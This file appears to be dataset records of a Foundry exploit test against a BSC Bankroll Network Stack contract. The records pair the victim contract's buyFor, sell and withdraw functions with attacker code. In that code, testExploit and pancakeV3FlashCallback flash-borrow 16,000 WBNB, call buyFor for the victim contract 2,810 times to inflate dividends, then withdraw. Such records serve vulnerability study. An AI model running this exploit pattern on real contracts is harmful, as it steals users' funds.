[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory) public {\n        WBNB.approve(address(bankRoll), type(uint256).max);\n\n        bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));\n\n        uint256 bal_bank_roll = WBNB.balanceOf(address(bankRoll));\n\n        emit log_named_decimal_uint(\"[Before] Attacker bank roll balance\", bankRoll.myTokens(), 0);\n        emit log_named_decimal_uint(\"[Before] Attacker bank roll dividends\", bankRoll.dividendsOf(address(this)), 0);\n\n        for (uint256 i = 0; i < 2810; i++) {\n            bankRoll.buyFor(address(bankRoll), bal_bank_roll);\n        }\n\n        emit log_named_decimal_uint(\"[After] Attacker bank roll balance\", bankRoll.myTokens(), 0);\n        emit log_named_decimal_uint(\"[After] Attacker bank roll dividends\", bankRoll.dividendsOf(address(this)), 0);\n\n        bankRoll.sell(bankRoll.myTokens());\n        bankRoll.withdraw();\n\n        WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 42_481_611 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker WBNB before exploit\", WBNB.balanceOf(address(this)), 18);\n\n        borrow_amount = 16_000 ether;\n        pool.flash(address(this), 0, borrow_amount, \"0x01\");\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBankrollNetworkStack",
    "source_type": "victim_contract",
    "function_name": "buyFor",
    "original_code": "    function buyFor(address _customerAddress, uint buy_amount) public returns (uint256)  {\n        require(token.transferFrom(_customerAddress, address(this), buy_amount));\n        totalDeposits += buy_amount;\n        uint amount = purchaseTokens(_customerAddress, buy_amount);\n\n        emit onLeaderBoard(_customerAddress,\n            stats[_customerAddress].invested,\n            tokenBalanceLedger_[_customerAddress],\n            stats[_customerAddress].withdrawn,\n            now\n        );\n\n        //distribute\n        distribute();\n\n        return amount;\n    }\n\n\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBankrollNetworkStack",
    "source_type": "victim_contract",
    "function_name": "dividendsOf",
    "original_code": "    function dividendsOf(address _customerAddress) public view returns (uint256) {\n        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\n    }\n\n\n    /// @dev Return the sell price of 1 individual token.\n",
    "description": ""
  },
  {
    "contract/interface": "IBankrollNetworkStack",
    "source_type": "victim_contract",
    "function_name": "myTokens",
    "original_code": "    function myTokens() public view returns (uint256) {\n        address _customerAddress = msg.sender;\n        return balanceOf(_customerAddress);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBankrollNetworkStack",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "    function sell(uint256 _amountOfTokens) onlyBagholders public {\n        // setup data\n        address _customerAddress = msg.sender;\n\n        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n\n\n        // data setup\n        uint256 _undividedDividends = SafeMath.mul(_amountOfTokens, exitFee_) / 100;\n        uint256 _taxedeth = SafeMath.sub(_amountOfTokens, _undividedDividends);\n\n        // burn the sold tokens\n        tokenSupply_ = SafeMath.sub(tokenSupply_, _amountOfTokens);\n        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n\n        // update dividends tracker\n        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens + (_taxedeth * magnitude));\n        payoutsTo_[_customerAddress] -= _updatedPayouts;\n\n\n        //drip and buybacks\n        allocateFees(_undividedDividends);\n\n        // fire event\n        emit onTokenSell(_customerAddress, _amountOfTokens, _taxedeth, now);\n\n        //distribute\n        distribute();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBankrollNetworkStack",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw() onlyStronghands public {\n        // setup data\n        address _customerAddress = msg.sender;\n        uint256 _dividends = myDividends();\n\n        // update dividend tracker\n        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\n\n\n        // lambo delivery service\n        token.transfer(_customerAddress,_dividends);\n\n        //stats\n        stats[_customerAddress].withdrawn = SafeMath.add(stats[_customerAddress].withdrawn, _dividends);\n        stats[_customerAddress].xWithdrawn += 1;\n        totalTxs += 1;\n        totalClaims += _dividends;\n\n        // fire event\n        emit onWithdraw(_customerAddress, _dividends, now);\n\n        emit onLeaderBoard(_customerAddress,\n            stats[_customerAddress].invested,\n            tokenBalanceLedger_[_customerAddress],\n            stats[_customerAddress].withdrawn,\n            now\n        );\n\n        //distribute\n        distribute();\n    }\n\n\n    /// @dev Liquifies tokens to eth.\n",
    "description": ""
  }
]